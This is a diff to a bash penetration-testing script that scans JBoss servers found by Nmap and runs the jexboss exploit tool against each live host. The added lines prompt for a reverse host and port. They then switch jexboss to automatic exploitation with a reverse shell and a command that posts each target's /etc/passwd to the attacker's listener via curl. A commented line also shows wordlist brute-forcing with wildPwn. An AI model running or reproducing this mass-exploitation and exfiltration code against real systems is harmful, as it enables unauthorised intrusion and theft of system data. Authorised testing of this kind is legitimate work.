@@ -72,6 +72,11 @@ xsltproc $pth/$workpth/Nmap/NBME_JBOSS.xml -o $workpth/Reports/NBME_JBOSS_Nmap.h
 
 #Perform targeted scan using jexboss
 cd /tmp/jexboss/
+echo "What is the reverse host (your machine)?"
+read RHOST
+echo "What is the reverse port (listening port)?"
+read RPORT
+echo
 for IP in $(cat $pth/$workpth/Nmap/livehosts); do
 	for PORTNUM in ${PORT[*]}; do
 		STAT1=$(cat $pth/$workpth/Nmap/NBME_JBOSS.gnmap | grep $IP | grep "Status: Up" -m 1 -o | cut -c 9-10)
@@ -79,21 +84,15 @@ for IP in $(cat $pth/$workpth/Nmap/livehosts); do
 		STAT3=$(cat $pth/$workpth/Nmap/NBME_JBOSS.gnmap | grep $IP | grep "$PORTNUM/filtered" -m 1 -o | grep "filtered" -o)
 		if [ "$STAT1" == "Up" ] && [ "$STAT2" == "open" ] || [ "$STAT3" == "filtered" ];then
 			if [ "$PORTNUM" == "443" ];then
-				python jexboss.py -u https://$IP -results "$pth/$workpth/JexBoss/$IP-$PORTNUM-HTTPS-JexBOSS" -out "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM-report_file_scan2.log" | tee -a "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM"
+				python jexboss.py -u https://$IP | tee -a "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM"
 			fi
-			python jexboss.py -u http://$IP:$PORTNUM -results "$pth/$workpth/JexBoss/$IP-$PORTNUM-HTTP-JexBOSS" -out "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM-report_file_scan.log" | tee -a "$pth/$workpth/JexBoss/$IP-$PORTNUM"
-			python jexboss.py -u https://$IP:$PORTNUM -results "$pth/$workpth/JexBoss/$IP-$PORTNUM-HTTPS-JexBOSS" -out "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM-report_file_scan2.log" | tee -a "$pth/$workpth/JexBoss/Logs/$IP-$PORTNUM"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTP-JexBOSS" | aha -t "JBOSS Report - $TodaysDAY-$TodaysYEAR" >> "$pth/$workpth/Reports/Jxboss.html"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTP-JexBOSS" | grep VUNERABLE >> "$pth/$workpth/Reports/Final_Vulnerable.txt"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTP-JexBOSS" | grep EXPOSED >> "$pth/$workpth/Reports/Final_EXPOSED.txt"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTP-JexBOSS" | grep OK >> "$pth/$workpth/Reports/Final_OK.txt"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTPS-JexBOSS" | aha -t "JBOSS Report - $TodaysDAY-$TodaysYEAR" >> "$pth/$workpth/Reports/Jxboss.html"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTPS-JexBOSS" | grep VUNERABLE >> "$pth/$workpth/Reports/Final_Vulnerable.txt"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTPS-JexBOSS" | grep EXPOSED >> "$pth/$workpth/Reports/Final_EXPOSED.txt"
-			cat "$pth/$workpth/JexBoss/$IP:$PORTNUM-HTTPS-JexBOSS" | grep OK >> "$pth/$workpth/Reports/Final_OK.txt"
+			python jexboss.py -u http://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$pth/$workpth/JexBoss/$IP-$PORTNUM"
+			echo >> $pth/$workpth/JexBoss/$IP-$PORTNUM
+			python jexboss.py -u https://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$pth/$workpth/JexBoss/$IP-$PORTNUM"
 		fi
 	done
 done
+cp /tmp/jexboss/jexboss_$TodaysYEAR-$TodaysDAY.log $pth/$workpth/JexBoss/
 
 #Perform targeted scanning using wildPwn
 #python wildPwn.py -m deploy --target <TARGET> --port <PORT> -pass /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -user /usr/share/seclists/Usernames/top-usernames-shortlist.txt
@@ -182,6 +181,8 @@ unset passwrd
 unset PORT
 unset PORTNUM
 unset pth
+unset RHOST
+unset RPORT
 unset STAT1
 unset STAT2
 unset STAT3
